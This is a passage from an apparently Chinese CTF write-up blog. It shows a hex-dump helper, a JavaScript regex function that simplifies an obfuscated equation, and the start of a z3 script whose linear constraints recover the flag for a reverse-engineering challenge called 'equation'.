class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x54</span>,<span class="number">0x54</span>,<span class="number">0x54</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i,i+<span class="number">16</span>):</span><br><span class="line">        print(<span class="string">&quot;%02x&quot;</span>%a[j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>

<h2 id="rev-equation"><a href="#rev-equation" class="headerlink" title="[rev]equation"></a>[rev]equation</h2><p>自写脚本解不动了，使用大佬的正则表达式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deEquation</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; i++) &#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/l\[(\D*?)](\+l|-l|==)/g</span>, <span class="function">(<span class="params">m, a, b</span>) =&gt;</span> <span class="string">&#x27;l[&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;]&#x27;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">    str = str.replace(<span class="regexp">/==(\D*?)&amp;&amp;/g</span>, <span class="function">(<span class="params">m, a</span>) =&gt;</span> <span class="string">&#x27;==&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;&amp;&amp;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后解析使用python脚本z3一跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">&#x27;l%d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2a</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(l[<span class="number">40</span>]+l[<span class="number">35</span>]+l[<span class="number">34</span>]-l[<span class="number">0</span>]-l[<span class="number">15</span>]-l[<span class="number">37</span>]+l[<span class="number">7</span>]+l[<span class="number">6</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">19</span>]+l[<span class="number">8</span>]-l[<span class="number">17</span>]-l[<span class="number">14</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">9</span>]+l[<span class="number">22</span>]+l[<span class="number">41</span>]+l[<span class="number">3</span>]-l[<span class="number">29</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]+l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">30</span>]+l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">2</span>]+l[<span class="number">27</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">33</span>]-l[<span class="number">18</span>]+l[<span class="number">4</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">31</span>]+l[<span class="number">26</span>]+l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">27</span>]-l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">30</span>]+l[<span class="number">1</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]-l[<span class="number">41</span>]-l[<span class="number">14</span>]-l[<span class="number">19</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]-l[<span class="number">6</span>]-l[<span class="number">0</span>]-l[<span class="number">22</span>]-l[<span class="number">18</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]+l[<span class="number">34</span>]-l[<span class="number">21</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">8</span>]-l[<span class="number">40</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]==<span class="number">-448</span>)</span><br><span class="line">s.add(l[<span class="number">26</span>]+l[<span class="number">14</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]+l[<span class="number">13</span>]+l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">7</span>]+l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">25</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">35</span>]-l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">8</span>]+l[<span class="number">10</span>]-l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]+l[<span class="number">17</span>]+l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]+l[<span class="number">38</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]==<span class="number">1244</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">22</span>]+l[<span class="number">15</span>]+l[<span class="number">2</span>]-l[<span class="number">28</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]-l[<span class="number">18</span>]+l[<span class="number">30</span>]-l[<span class="number">9</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">34</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]+l[<span class="number">16</span>]-l[<span class="number">7</span>]+l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]-l[<span class="number">12</span>]-l[<span class="number">40</span>]-l[<span class="number">25</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">20</span>]-l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">33</span>]-l[<span class="number">21</span>]+l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]==<span class="number">-39</span>)</span><br><span class="line">s.add(l[<span class="number">41</span>]-l[<span class="number">29</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">20</span>]-l[<span class="number">33</span>]+l[<span class="number">35</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">26</span>]-l[<span class="number">24</span>]-l[<span class="number">17</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]-l[<span class="number">0</span>]-l[<span class="number">13</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]+l[<span class="number">14</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">40</span>]+l[<span class="number">34</span>]-l[<span class="number">38</span>]+l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">2</span>]+l[<span class="number">15</span>]+l[<span class="number">6</span>]+l[<span class="number">28</span>]-l[<span class="number">8</span>]-l[<span class="number">5</span>]-l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">27</span>]==<span class="number">485</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">2</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">39</span>]+l[<span class="number">31</span>]-l[<span class="number">23</span>]-l[<span class="number">41</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">20</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">6</span>]-l[<span class="number">16</span>]-l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">22</span>]-l[<span class="number">25</span>]-l[<span class="number">34</span>]-l[<span class="number">17</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]==<span class="number">-1068</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">13</span>]+l[<span class="number">24</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">1</span>]+l[<span class="number">39</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">25</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">17</span>]+l[<span class="number">10</span>]+l[<span class="number">40</span>]+l[<span class="number">34</span>]+l[<span class="number">27</span>]-l[<span class="number">20</span>]+l[<span class="number">23</span>]+l[<span class="number">31</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">30</span>]+l[<span class="number">29</span>]-l[<span class="number">4</span>]==<span class="number">939</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]+l[<span class="number">11</span>]+l[<span class="number">20</span>]-l[<span class="number">16</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">31</span>]+l[<span class="number">28</span>]-l[<span class="number">23</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">27</span>]+l[<span class="number">35</span>]+l[<span class="number">39</span>]-l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">22</span>]+l[<span class="number">5</span>]-l[<span class="number">6</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]+l[<span class="number">24</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">38</span>]+l[<span class="number">15</span>]-l[<span class="number">2</span>]+l[<span class="number">30</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">3</span>]-l[<span class="number">17</span>]+l[<span class="number">34</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">26</span>]==<span class="number">413</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]+l[<span class="number">4</span>]-l[<span class="number">9</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]+l[<span class="number">17</span>]+l[<span class="number">3</span>]-l[<span class="number">24</span>]+l[<span class="number">38</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]-l[<span class="number">31</span>]-l[<span class="number">0</span>]-l[<span class="number">25</span>]+l[<span class="number">33</span>]+l[<span class="number">15</span>]-l[<span class="number">1</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]-l[<span class="number">29</span>]-l[<span class="number">12</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]-l[<span class="number">6</span>]-l[<span class="number">40</span>]-l[<span class="number">13</span>]+l[<span class="number">8</span>]+l[<span class="number">37</span>]+l[<span class="number">19</span>]+l[<span class="number">14</span>]+l[<span class="number">32</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]+l[<span class="number">7</span>]==<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">16</span>]+l[<span class="number">3</span>]+l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]-l[<span class="number">40</span>]-l[<span class="number">4</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]-l[<span class="number">27</span>]+l[<span class="number">13</span>]-l[<span class="number">19</span>]-l[<span class="number">12</span>]+l[<span class="number">23</span>]-l[<span class="number">39</span>]-l[<span class="number">41</span>]-l[<span class="number">8</span>]+l[<span class="number">22</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">9</span>]-l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]-l[<span class="number">7</span>]+l[<span class="number">35</span>]-l[<span class="number">0</span>]==<span class="number">-313</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]-l[<span class="number">1</span>]+l[<span class="number">5</span>]+l[<span class="number">7</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">38</span>]-l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]-l[<span class="number">35</span>]-l[<span class="number">8</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]-l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">10</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">16</span>]+l[<span class="number">6</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]-l[<span class="number">30</span>]+l[<span class="number">37</span>]-l[<span class="number">19</span>]+l[<span class="number">21</span>]+l[<span class="number">25</span>]-l[<span class="number">15</span>]==<span class="number">-42</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]+l[<span class="number">26</span>]-l[<span class="number">17</span>]-l[<span class="number">25</span>]+l[<span class="number">27</span>]-l[<span class="number">22</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">15</span>]-l[<span class="number">20</span>]-l[<span class="number">32</span>]+l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]+l[<span class="number">28</span>]+l[<span class="number">31</span>]+l[<span class="number">13</span>]-l[<span class="number">16</span>]-l[<span class="number">37</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]+l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">1</span>]+l[<span class="number">11</span>]+l[<span class="number">24</span>]+l[<span class="number">18</span>]-l[<span class="number">40</span>]+l[<span class="number">19</span>]-l[<span class="number">35</span>]+l[<span class="number">2</span>]-l[<span class="number">38</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]+l[<span class="number">4</span>]+l[<span class="number">0</span>]-l[<span class="number">33</span>]==<span class="number">289</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">31</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]-l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">35</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]-l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">24</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">18</span>]-l[<span class="number">0</span>]+l[<span class="number">12</span>]+l[<span class="number">11</span>]-l[<span class="number">38</span>]+l[<span class="number">6</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">25</span>]-l[<span class="number">10</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]+l[<span class="number">30</span>]-l[<span class="number">16</span>]+l[<span class="number">28</span>]-l[<span class="number">26</span>]==<span class="number">-117</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">0</span>]-l[<span class="number">27</span>]+l[<span class="number">12</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">38</span>]+l[<span class="number">9</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]+l[<span class="number">6</span>]-l[<span class="number">25</span>]-l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">14</span>]-l[<span class="number">1</span>]+l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">19</span>]-l[<span class="number">4</span>]-l[<span class="number">7</span>]+l[<span class="number">26</span>]+l[<span class="number">30</span>]-l[<span class="number">10</span>]+l[<span class="number">13</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">23</span>]-l[<span class="number">3</span>]-l[<span class="number">33</span>]==<span class="number">-252</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]-l[<span class="number">9</span>]+l[<span class="number">12</span>]-l[<span class="number">28</span>]+l[<span class="number">11</span>]+l[<span class="number">40</span>]-l[<span class="number">27</span>]-l[<span class="number">8</span>]+l[<span class="number">32</span>]-l[<span class="number">25</span>]-l[<span class="number">23</span>]+l[<span class="number">39</span>]-l[<span class="number">1</span>]-l[<span class="number">36</span>]-l[<span class="number">15</span>]+l[<span class="number">33</span>]-l[<span class="number">20</span>]+l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">34</span>]-l[<span class="number">21</span>]+l[<span class="number">19</span>]+l[<span class="number">26</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]+l[<span class="number">7</span>]-l[<span class="number">37</span>]+l[<span class="number">38</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">0</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]==<span class="number">-183</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">8</span>]-l[<span class="number">20</span>]+l[<span class="number">34</span>]-l[<span class="number">33</span>]-l[<span class="number">25</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]-l[<span class="number">13</span>]-l[<span class="number">15</span>]-l[<span class="number">40</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">28</span>]-l[<span class="number">35</span>]+l[<span class="number">38</span>]-l[<span class="number">22</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">5</span>]+l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">23</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">10</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]+l[<span class="number">31</span>]==<span class="number">188</span>)</span><br><span class="line">s.add(l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">10</span>]+l[<span class="number">39</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]+l[<span class="number">24</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">27</span>]-l[<span class="number">38</span>]+l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">28</span>]+l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]-l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">34</span>]+l[<span class="number">20</span>]-l[<span class="number">22</span>]-l[<span class="number">16</span>]+l[<span class="number">19</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">7</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]-l[<span class="number">4</span>]+l[<span class="number">35</span>]==<span class="number">1036</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]-l[<span class="number">33</span>]+l[<span class="number">2</span>]+l[<span class="number">37</span>]-l[<span class="number">12</span>]-l[<span class="number">9</span>]-l[<span class="number">39</span>]+l[<span class="number">16</span>]-l[<span class="number">32</span>]+l[<span class="number">8</span>]-l[<span class="number">36</span>]+l[<span class="number">31</span>]+l[<span class="number">10</span>]-l[<span class="number">4</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">18</span>]+l[<span class="number">24</span>]-l[<span class="number">0</span>]+l[<span class="number">29</span>]-l[<span class="number">26</span>]+l[<span class="number">35</span>]-l[<span class="number">22</span>]-l[<span class="number">41</span>]-l[<span class="number">6</span>]+l[<span class="number">15</span>]+l[<span class="number">19</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]+l[<span class="number">5</span>]+l[<span class="number">23</span>]+l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]==<span class="number">328</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]-l[<span class="number">32</span>]+l[<span class="number">17</span>]-l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">34</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]-l[<span class="number">35</span>]-l[<span class="number">38</span>]+l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]-l[<span class="number">37</span>]+l[<span class="number">28</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">12</span>]+l[<span class="number">7</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">24</span>]-l[<span class="number">25</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]-l[<span class="number">19</span>]-l[<span class="number">39</span>]-l[<span class="number">14</span>]-l[<span class="number">31</span>]+l[<span class="number">10</span>]==<span class="number">-196</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">13</span>]+l[<span class="number">14</span>]-l[<span class="number">15</span>]-l[<span class="number">29</span>]-l[<span class="number">2</span>]+l[<span class="number">7</span>]+l[<span class="number">20</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">33</span>]-l[<span class="number">19</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]-l[<span class="number">39</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">23</span>]-l[<span class="number">26</span>]+l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">27</span>]+l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">10</span>]+l[<span class="number">25</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">18</span>]+l[<span class="number">32</span>]==<span class="number">7</span>)</span><br><span class="line">s.add(l[<span class="number">34</span>]-l[<span class="number">37</span>]-l[<span class="number">40</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]-l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span 